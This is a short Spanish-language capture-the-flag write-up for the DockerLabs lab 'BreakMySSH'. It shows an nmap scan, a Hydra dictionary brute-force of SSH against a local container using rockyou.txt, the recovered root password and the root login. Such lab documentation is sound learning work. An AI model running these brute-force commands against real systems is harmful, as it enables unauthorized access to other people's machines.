# BreakMySSH (DockerLabs)

**Plataforma:** DockerLabs  
**Dificultad:** Muy fácil  
**Objetivo:** Acceso inicial + root  
**Skills:** Recon, Enumeration, SSH

---

## 🧭 Resumen (Summary)
En esta máquina realicé reconocimiento del servicio SSH, obtuve acceso inicial y luego realicé escalada de privilegios hasta root.

---

### 1) Descomprimir el laboratorio

Una vez descargado el archivo .zip de la plataforma, procedemos a descomprimir su contenido con el comando:

 ```bash
unzip breakmyssh.zip
```

![Descompresión del archivo ZIP](images/unzip.png)

### 2) Despliegue de la maquina
Vemos que nos dan 3 archivos, lo siguiente que debemos hacer es darle permisos de ejecución al archivo llamado auto_deploy.sh, luego ejecutarlo pasandole el archivo .tar que nos brindaron al descomprimir, que en este caso, es el nombre de la maquina, vemos que la maquina se desplegará y los darán la IP objetivo.
```bash
chmod +x auto_deploy.sh
sudo ./auto_deploy.sh breakmyssh.tar
```
![imagen](images/dos.png)

### 3) Recon (Reconocimiento)

Inicié la fase de **Recon** realizando un escaneo completo con **Nmap** para identificar puertos abiertos y servicios expuestos.

```bash
sudo nmap --open -p- --min-rate 5000 -Pn -sVC 172.17.0.2 -oN escaneo
```
### 4) Resultados

 El escaneo confirmó que la máquina está activa y solo tiene un servicio expuesto:

22/tcp open ssh

Versión: OpenSSH 7.7 (protocol 2.0)

Al ser el único puerto abierto, la fase de Enumeration se enfocará en SSH (usuarios, credenciales y configuración).


![escaneo nmap](images/tres.png)

## 5) Enumeration (SSH) - Hydra

Como el único servicio expuesto es **SSH (22/tcp)**, realizamos una enumeración enfocada en credenciales usando **Hydra** (ataque de diccionario) con un listado de usuarios comunes y el diccionario `rockyou.txt`.

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
## 6) Resultados del ataque de fuerza bruta - Hydra
Se encontraron credenciales válidas para SSH:

user: root
password: estrella

![resultado hydra](images/cuatro.png)

 ## 7) Proof (Root)

Finalmente, nos conectamos por **SSH** utilizando las credenciales encontradas, hacemos un whoami y vemos que ya somos usuario **root**, logrando el control total del sistema.

```bash
ssh root@172.17.0.2
whoami
```
![entrada al sistema por ssh](images/cinco.png)

